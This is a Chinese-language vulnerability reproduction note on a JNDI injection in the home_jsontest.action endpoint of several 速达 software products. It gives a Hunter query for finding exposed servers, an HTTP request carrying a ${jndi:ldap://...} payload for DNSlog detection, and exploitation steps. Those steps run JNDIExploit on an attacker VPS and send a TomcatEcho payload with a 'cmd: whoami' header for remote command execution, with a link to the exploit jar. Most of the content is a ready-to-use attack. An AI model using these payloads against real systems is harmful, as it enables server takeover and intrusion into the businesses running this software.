# 速达软件技术（广州）有限公司多款产品home_jsontest存在JNID注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品home_jsontest存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征

![1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5.png](./img/vbR5mYTuE8woTkQt/1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5-774482.png)

![1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae.png](./img/vbR5mYTuE8woTkQt/1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae-980863.png)

# 四、漏洞复现
1. 获取dnslog

```plain
56tcas.dnslog.cn
```

![1705075555323-9faae18e-4bfa-4803-a7d5-9408d85060f0.png](./img/vbR5mYTuE8woTkQt/1705075555323-9faae18e-4bfa-4803-a7d5-9408d85060f0-593145.png)

2. 检测是否存在漏洞

```plain
GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://56tcas.dnslog.cn} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC
Connection: close
```

![1705075600920-3fb66b0b-cb28-4cef-9746-025483e9b4b3.png](./img/vbR5mYTuE8woTkQt/1705075600920-3fb66b0b-cb28-4cef-9746-025483e9b4b3-699206.png)

![1705075633851-0f65cea0-d544-45dc-b23d-8a1bb4d513db.png](./img/vbR5mYTuE8woTkQt/1705075633851-0f65cea0-d544-45dc-b23d-8a1bb4d513db-391053.png)

漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146440-fd7d4f17-a37c-4c78-b216-daf75b276c2c.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```

![1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb.png](./img/vbR5mYTuE8woTkQt/1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb-265724.png)

```plain
GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC
Connection: close
```

![1705075717234-da653e58-3474-4718-9917-d7a1d5f6e028.png](./img/vbR5mYTuE8woTkQt/1705075717234-da653e58-3474-4718-9917-d7a1d5f6e028-765312.png)



> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gfkhwzlwu9779wkv>